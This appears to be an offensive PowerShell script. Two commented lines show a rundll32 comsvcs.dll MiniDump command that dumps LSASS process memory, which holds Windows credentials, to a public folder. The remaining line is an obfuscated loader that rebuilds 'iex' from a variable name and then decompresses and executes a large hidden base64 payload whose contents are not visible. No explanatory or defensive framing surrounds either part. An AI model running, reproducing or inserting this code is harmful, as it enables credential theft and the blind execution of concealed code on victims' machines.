#rundll32.exe C:\windows\system32\comsvcs.dll, Minidump (ps lsass).id C:\users\Public\documents\l.dmp full
# rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (ps lsass).id C:\Users\Public\Documents\DUMP-${env:computername} full
 . ( ([stRiNG]$vERbOsEPREFerence)[1,3]+'x'-JoiN'')(neW-OBJEcT  sYSTEM.Io.STREamreadER(( neW-OBJEcT iO.coMpREsSIoN.dEfLAtEStrEam( [IO.MemorysTrEaM] [syStem.ConvERt]::fromBASe64StrING('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' ),[Io.cOMPrESSIoN.COMPreSSiONmODe]::DecOmpReSs) ) , [sYSTEM.TExt.enCODInG]::Ascii) ).REAdTOeND() 